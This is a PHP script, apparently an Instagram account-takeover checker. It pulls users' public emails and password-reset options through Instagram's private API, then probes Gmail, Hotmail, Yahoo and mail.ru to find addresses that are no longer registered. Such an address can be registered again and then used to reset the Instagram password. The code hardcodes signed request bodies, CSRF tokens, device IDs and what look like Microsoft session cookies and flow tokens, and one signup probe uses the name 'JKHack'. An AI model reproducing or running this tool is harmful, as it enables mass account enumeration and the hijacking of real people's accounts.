<?php

function checkMail($mail){global $IGMail;$mail = strtolower($mail);if(mb_substr($mail, -10) === '@gmail.com'){return checkGmail($mail);return $IGMail->verifyEmail($mail); return;} elseif(preg_match('/(live|hotmail|outlook)\.(.*)/', $mail)){return checkHotmail(newURL(),$mail);} elseif(strpos($mail, 'yahoo.com')){return checkYahoo($mail);} elseif(preg_match('/(mail|bk|yandex|inbox|list)\.(ru)/i', $mail)){return checkRU($mail);} else {return false;}}
function rest($mail){$mail = strtolower($mail);$search = curl_init(); curl_setopt($search, CURLOPT_URL, "https://i.instagram.com/api/v1/users/lookup/"); curl_setopt($search, CURLOPT_RETURNTRANSFER, 1);curl_setopt($search, CURLOPT_ENCODING , "");curl_setopt($search, CURLOPT_HTTPHEADER, explode("\n", 'Host: i.instagram.com
Connection: keep-alive
X-IG-Connection-Type: WIFI
X-IG-Capabilities: 3Ro=
Accept-Language: en-US
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
User-Agent: Instagram 9.7.0 Android (28/9; 420dpi; 1080x2131; samsung; SM-A505F; a50; exynos9610; en_US)
Accept-Encoding: gzip, deflate
t'));
curl_setopt($search,CURLOPT_POST, 1);
$fields = 'signed_body=acd10e3607b478b845184ff7af8d796aec14425d5f00276567ea0876b1ff2630.%7B%22_csrftoken%22%3A%22rZj5Y3kci0OWbO8AMUi0mWwcBnUgnJDY%22%2C%22q%22%3A%22'.urlencode($mail).'%22%2C%22_uid%22%3A%226758469524%22%2C%22guid%22%3A%22a475d908-a663-4895-ac60-c0ab0853d6df%22%2C%22device_id%22%3A%22android-1a9898fad127fa2a%22%2C%22_uuid%22%3A%22a475d908-a663-4895-ac60-c0ab0853d6df%22%7D&ig_sig_key_version=4';
curl_setopt($search,CURLOPT_POSTFIELDS, $fields);
$search = curl_exec($search);
// echo $search;
$search = json_decode($search);
    if($search->status != 'fail'){
        if($search->can_email_reset == true){
            return ['fb'=>$search->fb_login_option,'ph'=>$search->has_valid_phone];
        } else {
            return false;
        }
    } else {        return false;  }								};function getInfo($id,$cookies,$useragent){
$search = curl_init(); 
curl_setopt($search, CURLOPT_URL, "https://i.instagram.com/api/v1/users/".trim($id)."/usernameinfo/"); 
curl_setopt($search, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($search, CURLOPT_ENCODING , "");
curl_setopt($search, CURLOPT_TIMEOUT, 15);
$h = explode("\n", 'Host: i.instagram.com
Connection: keep-alive
X-IG-Connection-Type: WIFI
X-IG-Capabilities: 3Ro=
Accept-Language: en-US
Cookie: '.$cookies.'
User-Agent: '.$useragent.'
Accept-Encoding: gzip, deflate, sdch');
curl_setopt($search, CURLOPT_HTTPHEADER, $h);
$search = curl_exec($search);
// echo $search;
$search = json_decode($search);

if(isset($search->user)){
    $user = $search->user;
$ret = ['f'=>$user->follower_count,'ff'=>$user->following_count,'m'=>$user->media_count,'user'=>$user->username];
if(isset($user->public_email)){
  if($user->public_email != ''){
      $mail = $user->public_email;
      $ret['mail'] = $mail;
  } else {
      $ret = false;
  }
} else {
  $ret = false;
}
} elseif($search->message){
    if($search->message == 'Please wait a few minutes before you try again.' or $search->message == 'challenge_required'){
        $ret = 'checkpoint';
        usleep (888888);
    } else {
        echo json_encode($search);    
    }
} else {
    echo json_encode($search);
    $ret = false;
}
return $ret;
}
function newURL(){
  $url = 'https://login.live.com/';
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL,$url);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_HEADER, 1);
  $get = curl_exec($ch);
  curl_close($ch);
  preg_match("/\:'https\:\/\/login.live.com\/GetCredentialType(.*)',/", $get,$m);
  $url = explode("',", $m[0])[0];
  $url = str_replace(':\'', '',$url);
  return $url;
}
function checkRU($mail){
    $mail = trim($mail);
    if(strpos($mail, ' ') or strpos($mail, '+')){
        return false;
    }
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL,"https://auth.mail.ru/api/v1/pushauth/info?login=".urlencode($mail)."&_=1580336451166");
  curl_setopt($ch,CURLOPT_HTTPHEADER, [
    'Host: recostream.go.mail.ru',
'Connection: keep-alive',
'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36',
'Accept: */*',
'Origin: https://mail.ru',
'Sec-Fetch-Site: same-site',
'Sec-Fetch-Mode: cors',
'Referer: https://mail.ru/',
'Accept-Encoding: gzip, deflate, br',
'Accept-Language: en-US,en;q=0.9,ar;q=0.8'
    ]);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  $res = curl_exec($ch);
  curl_close($ch);
//   return ;
    if(!json_decode($res)->body->exists) {
        return true;
    } else {
        return false;
    }
}
function checkYahoo($mail){
    $mail = trim($mail);
    if(strpos($mail, ' ') or strpos($mail, '+')){
        return false;
    }
$user = $mail;
@mkdir("Info");
$c = curl_init("https://login.yahoo.com/"); 
curl_setopt($c, CURLOPT_FOLLOWLOCATION, true); 
curl_setopt($c, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36"); 
curl_setopt($c, CURLOPT_REFERER, 'https://www.google.com'); 
curl_setopt($c, CURLOPT_ENCODING, 'gzip, deflate, br');  
curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);  
curl_setopt($c, CURLOPT_HEADER, true); 
curl_setopt($c, CURLOPT_COOKIEJAR, "Info/cookie.txt"); 
curl_setopt($c, CURLOPT_COOKIEFILE, "Info/cookie.txt"); 
$response = curl_exec($c); 
$httpcode = curl_getinfo($c); 
$header = substr($response, 0, curl_getinfo($c, CURLINFO_HEADER_SIZE)); 
$body = substr($response, curl_getinfo($c, CURLINFO_HEADER_SIZE)); 
preg_match_all('#name="crumb" value="(.*?)" />#', $response, $crumb); 
preg_match_all('#name="acrumb" value="(.*?)" />#', $response, $acrumb); 
preg_match_all('#name="config" value="(.*?)" />#', $response, $config); 
preg_match_all('#name="sessionIndex" value="(.*?)" />#', $response, $sesindex); 
$data['status'] = "ok"; 
$data['crumb'] = isset($crumb[1][0]) ? $crumb[1][0] : ""; 
$data['acrumb'] = $acrumb[1][0]; 
$data['config'] = isset($config[1][0]) ? $config[1][0] : ""; 
$data['sesindex'] = $sesindex[1][0]; 
$crumb = trim($data['crumb']); 
$acrumb = trim($data['acrumb']); 
$config = trim($data['config']); 
$sesindex = trim($data['sesindex']); 
$header = array(); 
$header[] = "Host: login.yahoo.com"; 
$header[] = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0"; 
$header[] = "Accept: */*"; 
$header[] = "Accept-Language: en-US,en;q=0.5"; 
$header[] = "content-type: application/x-www-form-urlencoded; charset=UTF-8"; 
$header[] = "X-Requested-With: XMLHttpRequest"; 
$header[] = "Referer: https://login.yahoo.com/"; 
$header[] = "Connection: keep-alive"; 
$data = "acrumb=$acrumb&sessionIndex=$sesindex&username=".urlencode($user)."&passwd=&signin=Next"; 
$c = curl_init("https://login.yahoo.com/"); 
curl_setopt($c, CURLOPT_FOLLOWLOCATION, true); 
curl_setopt($c, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0"); 
curl_setopt($c, CURLOPT_REFERER, 'https://login.yahoo.com/'); 
curl_setopt($c, CURLOPT_ENCODING, 'gzip, deflate, br');  
curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);  
curl_setopt($c, CURLOPT_HTTPHEADER, $header); 
curl_setopt($c, CURLOPT_COOKIEJAR, "Info/cookie.txt"); 
curl_setopt($c, CURLOPT_COOKIEFILE, "Info/cookie.txt"); 
curl_setopt($c, CURLOPT_POSTFIELDS, $data); 
curl_setopt($c, CURLOPT_POST, 1); 
$b = curl_exec($c); 
if(strstr($b,"INVALID_USERNAME")){
return true;
}else{
return false;
}
}
function verifyEmail($email){
    $ip = file_get_contents("ip.txt");
    $gmail = json_decode(file_get_contents("http://$ip/api/gmail.php?email=$email"),true)["result"]["success"];
    if($gmail){
      return false;
    }else{
     return true;
  }

}
function check_ban($gmail){
    $gmail = str_replace("@gmail.com", "", $gmail);
    $data = "{\"input01\":{\"Input\":\"GmailAddress\",\"GmailAddress\":\"".$gmail."\",\"FirstName\":\"JKHack\",\"LastName\":\"JKHack\"},\"Locale\":\"en\"}";
    
    $header = array(); 
    $header[] = "User-Agent: Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16"; 
    $header[] = "content-type: application/json; charset=utf-8"; 
    $c = curl_init("https://accounts.google.com/InputValidator?resource=SignUp&service=mail"); 
    curl_setopt($c, CURLOPT_USERAGENT, "Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16"); 
    curl_setopt($c, CURLOPT_HTTPHEADER, $header); 
    curl_setopt($c, CURLOPT_COOKIEJAR, "sessions/Gcookie.txt"); 
    curl_setopt($c, CURLOPT_COOKIEFILE, "sessions/Gcookie.txt"); 
    curl_setopt($c, CURLOPT_POSTFIELDS, $data);
    curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($c, CURLOPT_POST, 1); 
    $b = curl_exec($c);
    curl_close($c);
    
    if(preg_match('/"Valid":"true"/', $b)){

   $s = "Yes";
    }else{
      $s = "No";
    }
    return $s;
  }
function checkGmail($mail){
    $mail = trim($mail);
    if(strpos($mail, ' ') or strpos($mail, '+')){
        return false;
    }
  $mail = preg_replace('/@(.*)/', '',$mail);
   $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL,'https://accounts.google.com/InputValidator?resource=SignUp&service=mail');
  curl_setopt($ch,CURLOPT_HTTPHEADER, [
    'User-Agent: generate User agent ',
'Content-Type: application/json; charset=utf-8',
'Host: accounts.google.com',
'Expect: 100-continue',
    ]);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch,CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_ENCODING , "");
  // echo $mail;
  $fields = '{"input01":{"Input":"GmailAddress","GmailAddress":"'.$mail.'","FirstName":"'.str_shuffle('fdgh4hgbgbg').'","LastName":"'.str_shuffle('fdgh4hgbgbg').'"},"Locale":"en"}';
  curl_setopt($ch,CURLOPT_POSTFIELDS, $fields);
  $res = curl_exec($ch);
  curl_close($ch);
  $s =  json_decode($res);
  if(isset($s->input01)){
  if(isset($s->input01->Valid)){
      if($s->input01->Valid == 'true'){
          return true;
      } else {
          return false;
      }
  } else {
      return false;
  }
  } else {
      return false;
  }
}
function checkHotmail($url,$mail){
    $mail = trim($mail);
    if(strpos($mail, ' ') or strpos($mail, '+')){
        return false;
    }
  $uaid = explode('uaid=', $url)[1];
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL,$url);
  curl_setopt($ch,CURLOPT_HTTPHEADER, [
    'accept: application/json',
'accept-encoding: gzip, deflate, br',
'accept-language: en-US,en;q=0.9,ar;q=0.8',
'client-request-id: e50b9d86940a4a6b806f141aeb87c2be',
'content-type: application/json; charset=UTF-8',
'cookie: mkt=en-GB; MSCC=1565316440; optimizelyEndUserId=oeu1578914839745r0.28780916970876746; wlidperf=FR=L&ST=1578914863298; logonLatency=LGN01=637153910513160953; uaid=e50b9d86940a4a6b806f141aeb87c2be; amsc=LDSu01eN1p8mu/aQOR8E/JsrWRw2umolJ57H96YKK9t9GpXT/1+TnnHT5teMGz0XmgPXf4UZumsU54kipsswO6VwZggyEEZkxrR8SJd5U3Bru+OEs+9IlLfml8nsNJ3ejH7piSM6y5EfybxtuLMV6SZZxPrFEODePzRujEx/dSV7jpiSYTNk/oajPVQIoZbABA+Hr8QjedZ5390TM7sQmrIwwSPfbUP9vTrTPwnm6GAsbf1k90qWSLMaldKhMPKz1IZCPvKBdWxmfda1hcHSkitzm2byDrC8a0LpF2XtGKG1rZ9S+WvSILthbvLn7tHD:2:3c; MSPRequ=id=N&lt=1579804236&co=0; OParams=11DQFpxS7pzYB5u6z67WXLWoJZxIv4EoI07SIv9NF400Ml6NW3t6RoWfW5Hr7lizMq9bTQDRrsBBlbQXkVL!Jzo6knJIEJdFbUDS!Cq1zNJJNK1ehiYyB5fMyO7bnj7Dfz!6mDuk2OShJVVlatli5JeYXDDFRljVvQzkJ91cXbHLJoRP9A!EbyBF3boCkZ7s9f*ePQZWGwqnAeCz3sclT68b4ntJXMLTAqi4CgcEiEE9XjSekdGg2q!pHh7IcjwLKjvusYzdiaK6axwAp4hw35vvcsyA4UOD26uE04LKjAFPIDZcXmrqzHNjklndRTqAp!1PMSFEvdlrAa9FyrbN1f6CA$; MSPOK=$uuid-84fae358-0e4d-4cbc-9401-c4c0d1dfc0b8$uuid-2dfff29d-11fd-4e53-85a7-8d3cff5e2754$uuid-b7c92f16-b89a-445d-95a9-cc1c6686aab2',
'hpgact: 0',
'hpgid: 33',
'origin: https://login.live.com',
'referer: https://login.live.com/',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36'
    ]);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_ENCODING , "");
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch,CURLOPT_POST, 1);
  curl_setopt($ch,CURLOPT_POSTFIELDS, '{"username":"'.$mail.'","uaid":"'.$uaid.'","isOtherIdpSupported":false,"checkPhones":true,"isRemoteNGCSupported":true,"isCookieBannerShown":false,"isFidoSupported":true,"forceotclogin":false,"otclogindisallowed":true,"isExternalFederationDisallowed":false,"isRemoteConnectSupported":false,"federationFlags":3,"flowToken":"DdMUDCNyFcwT9VK5vlBBCGF5VYFUBuVVVK2FCJkTvdIr8vao!78DWHV1d5iJQAlaBgKQtik4V0TTdj0gqiYx89skmL*Ir9FvzAs8FIul6MJmsHl*WMZuh0WOAYNDzGgH!5A9TURocDSg*qbkZVrdh1ZG0j5NWvtsfdqMRYbAqujacfOSUA2ZuxmvSFlYz3dxOG3DhusRzPYqFqfWhc3xLxFDzf4NhhCCPTdQ3BQfvcZ9yE0KqqOWnDllRJvXO!tJeA$$"}');
  $res = curl_exec($ch);
  curl_close($ch);
  $res = json_decode($res)->IfExistsResult;
  if($res == 1){
      return true;
  } else {
      return false;
  }
}
class EzTGException extends Exception
{
}
